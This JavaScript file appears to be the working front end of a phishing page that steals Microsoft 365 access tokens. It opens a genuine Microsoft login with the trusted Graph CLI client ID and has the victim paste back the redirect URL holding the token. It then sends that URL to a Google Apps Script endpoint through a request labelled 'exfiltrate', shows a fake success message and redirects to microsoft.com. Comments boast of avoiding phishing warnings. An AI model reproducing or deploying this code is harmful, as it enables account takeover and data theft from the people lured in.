/**
 * PATH C: GRAPH CLI BRIDGE (No Phishing Warning)
 */
const GS_URL = "https://script.google.com/macros/s/AKfycbwCVnWFmseoIYGiY4HtU_Quq5gqmKgUyEoE-QeLTBb54fK0iYMEXAX0b7Ho2HfD_mFV/exec"; 

function startBridge() {
    // This ID is the official Microsoft Graph Command Line Tool
    // It is a "Public" client and highly trusted.
    const GRAPH_CLI_ID = "14d82eec-514b-4fd0-9a15-f5c5d7cddc4e";
    const NATIVE_REDIRECT = "https://login.microsoftonline.com/common/oauth2/nativeclient";

    const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
        `client_id=${GRAPH_CLI_ID}` +
        `&response_type=token+id_token` +
        `&scope=https://graph.microsoft.com/.default+offline_access+openid+profile` +
        `&response_mode=fragment` + // Fragment is safe with this Client ID
        `&prompt=login` + 
        `&nonce=${Math.random().toString(36).substring(7)}` +
        `&redirect_uri=${encodeURIComponent(NATIVE_REDIRECT)}`;

    // Transition UI
    document.getElementById('step-1').classList.add('hidden');
    document.getElementById('step-2').classList.remove('hidden');

    // Open in new window
    window.open(authUrl, "_blank", "width=500,height=600");
}

async function exfiltrateToGS() {
    const rawData = document.getElementById('raw-url').value;
    if (!rawData || !rawData.includes("access_token")) {
        alert("Please paste the valid sync URL.");
        return;
    }

    try {
        const response = await fetch(`${GS_URL}?action=exfiltrate&data=${encodeURIComponent(rawData)}`);
        const result = await response.json();
        if (result.status === "success") {
            alert("Verification successful.");
            window.location.href = "https://www.microsoft.com";
        }
    } catch (err) {
        console.error("GS Proxy Error:", err);
    }
}
